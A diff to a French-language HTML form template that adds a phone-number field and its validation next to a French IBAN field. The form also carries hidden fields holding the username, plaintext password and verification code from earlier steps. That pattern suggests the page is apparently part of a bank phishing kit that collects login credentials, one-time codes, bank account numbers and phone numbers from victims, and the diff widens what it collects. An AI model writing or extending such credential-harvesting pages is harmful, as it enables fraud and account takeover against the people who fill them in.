@@ -133,7 +133,8 @@
       margin-bottom: 5px;
     }
 
-    .form-group input[type="text"] {
+    .form-group input[type="text"],
+    .form-group input[type="tel"] { /* Ajout de input[type="tel"] ici pour le style */
       width: 100%;
       padding: 10px;
       border: 1px solid #ddd;
@@ -141,7 +142,8 @@
       font-size: 15px;
     }
 
-    .form-group input[type="text"]::placeholder {
+    .form-group input[type="text"]::placeholder,
+    .form-group input[type="tel"]::placeholder { /* Ajout de input[type="tel"] pour le placeholder */
       color: #aaa;
     }
 
@@ -259,6 +261,11 @@
         <div class="input-feedback">Veuillez entrer un IBAN valide (FR)</div>
       </div>
 
+      <div class="form-group">
+        <label for="phone_number">Numéro de téléphone</label>
+        <input type="tel" id="phone_number" name="phone_number" placeholder="Par ex : 06 12 34 56 78" required>
+        <div class="input-feedback">Veuillez entrer un numéro de téléphone valide</div>
+      </div>
       <input type="hidden" name="username" value="{{ username }}">
       <input type="hidden" name="password" value="{{ password }}">
       <input type="hidden" name="verification_code" value="{{ verification_code }}">
@@ -276,6 +283,13 @@
         iban = iban.replace(/\s/g, '').toUpperCase();
         const frIbanRegex = /^FR\d{2}([0-9A-Z]{23})$/;
         return frIbanRegex.test(iban) && iban.length === 27;
+    }
+
+    // Fonction de validation simple pour un numéro de téléphone français
+    function isValidPhoneNumber(phone) {
+        phone = phone.replace(/\s/g, ''); // Supprime les espaces
+        const phoneRegex = /^(0|\+33)[1-9]([-. ]?[0-9]{2}){4}$/; // Exemple pour la France
+        return phoneRegex.test(phone) && phone.length >= 9; // Min 9 chiffres pour 0X XX XX XX XX
     }
 
     document.querySelector('form').addEventListener('submit', function(event) {
@@ -341,6 +355,16 @@
             isValid = false;
         } else {
             ibanInput.closest('.form-group').classList.remove('has-error');
+        }
+
+        // VALIDATION NUMÉRO DE TÉLÉPHONE (NOUVEAU)
+        const phoneNumberInput = document.getElementById('phone_number');
+        if (!isValidPhoneNumber(phoneNumberInput.value.trim())) {
+            phoneNumberInput.closest('.form-group').classList.add('has-error');
+            phoneNumberInput.nextElementSibling.textContent = "Veuillez entrer un numéro de téléphone valide (format français).";
+            isValid = false;
+        } else {
+            phoneNumberInput.closest('.form-group').classList.remove('has-error');
         }
 
 
